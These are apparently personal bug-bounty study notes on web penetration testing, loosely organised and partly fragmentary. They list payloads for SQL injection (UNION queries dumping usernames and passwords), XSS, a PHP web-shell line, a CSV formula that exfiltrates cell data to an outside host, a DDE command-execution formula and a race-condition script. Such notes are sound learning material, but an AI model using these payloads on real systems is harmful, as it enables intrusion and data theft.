# bug bounty reference

https://github.com/ngalongc/bug-bounty-reference
# web-pen-basic
understand





 - Command injection is "string to command".(;,||,&&, are used to join command.The `exec()` function is for code execution.
 - Code injection is "string to code".("." is used to join code)(`eval("echo "....)` function).Using " , ' for testing.
 - Directory traversal  is  "file to code".
 -  log poison
 - Using burp suit by replacing`<?php system($_GET[cmd]);`
 -  LFI , RFI(file=www.google.com or webshell)

File inclusion
---
 `include()` function 
 1. Command injection`echo exec("whoami")`
 2.                    `system("whoiam")`
 3. Blind command injection`exec("whoami")`
 4. [command payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
 5. Searching
            Regular expression security cheatsheet

SQL Injection
--

 1.union based(echo)
 - users where id=0 or 1=1     
 
 - testing numbers of columns with "order by"   
 -    union select,database(),version()   
 

     -1 union select 1,2,3,concat(table_name) from information_schema.tables where table_schema=database()    
     -1 union select 1,2,3,concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' //group_concat  
    
     -1 union select 1,2,3,concat(username,password) from users


  
 1. Error base(//echo)
       
 2. Blind based (//mysqli_report(MYSQLI_REPORT_ERROR |

MYSQLI_REPORT_STRICT))

     

 

 
 - Time based blind(1 -sleep(5))

    

 - boolean based blind(id=1 and 1=2) 
 ` $sql ="SELECT * FROM users WHERE id="$uid""`
 `$sql ="SELECT * FROM users WHERE id='$uid'"`
  `$sql ="SELECT * FROM users WHERE id=('$uid')"`

https://github.com/LunaM00n/Free-WebSec-Class/blob/master/Lectures/06.SQL%20Injection.md

Same Original Method Execution
--

 - html injection be
 - iframe does not allow taking script from another site.
 - [REF](https://github.com/LunaM00n/Free-WebSec-Class/blob/master/Lectures/07.Some.md)
 - universal xss

## CSV Injection
Reference
```
https://www.contextis.com/en/blog/comma-separated-vulnerabilities
https://blog.zsec.uk/csvhub/
```
Formulas  
```
=SUM(A1,A2)

```
Data Exfiltration
```
=HYPERLINK("http://host?leak="&A1&A2,"Error: please click for further information")
```
Client Side RCE ( Trust Relationships )
```
=cmd|' /C calc'!A0
```
Powersploit and Metasploit Client Side Payloads

```https://github.com/PowerShellMafia/PowerSploit ```

```https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/ ```

Cross-site Request Forgery(CSRF)
--

 - Using get method by viewing uri
 - Payload
 `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection`


Server Side Request Forgery(SSRF)
---

 - Have server ,client
 - server_address/ssrf.php?url=http://localhost/intranet.php
 
 
 
      <?php
    echo $_GET['name']
    ?> 
 

 
XSS
--
 1. Cookies can be stolen.
 2. Java script execution 
 3. Advanced handler like
 4. Obfuscation
 5. Bypass or Escape
 6. Avoiding
 7. HtmlSpecialCharacter works encoding
 8. After hash sign,browser encode it.
 9. can steal cookies 
 10.can execute script when you sent to other users. 
 
 `<img src=x onerror=alert(1)>`

`<script> prompt(1)</script>`

`<svg onload=alert(1) `

`<a onclick=alert(1)>`

`<body onload=alert(1)> `

[cheatsheethtml5](https://html5sec.org/)

**DOM**

[public_firing](https://public-firing-range.appspot.com/)

**
Relative Path Overwrite(RPO)**
 
[RPO](http://www.thespanner.co.uk/2014/03/21/rpo/)
[REF](https://blog.innerht.ml/)

XXE
--

>xpath or xxe (xml external entity )
>

[play xxe](https://pentesterlab.com/exercises/play_xxe/course)




Web Cache Poisoning
-

 - Using burp suit para miner
 -` Get\?`
 
 HTTP Host Header Injection
 --
 DOM
 --
 
 - location.hash
 - https://public-firing-range.appspot.com/

Race Condition(TOTUC)
--

 - Transfer each other
 - Other will get more than the amount of transferred
 
`import datetime
import requests
from threading import Thread

def intruder(i):
	reponse=requests.get("http://127.0.0.1/webpen/race_condition/racer.php?test")
	print "Thread #{} - {}".format(i,response.text)

for i in range(20):
   	t=Thread(target=intruder,args=(i,))
	t.start()`

 - https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
 - https://defuse.ca/race-conditions-in-web-applications.htm
 - https://sakurity.com/blog/2015/05/21/starbucks.html?source=post_page-------------------------

PHP Object Injection
--

 - Object Oriented Programming(OOP)
 - Magic Method(auto call)

Server Side Template Injection
---

Document Object Model
--
Relative Path  Overwrite
--

Reference
--

> [payload](https://github.com/swisskyrepo/PayloadsAllTheThings)
> https://github.com/LunaM00n/Free-WebSec-Class/
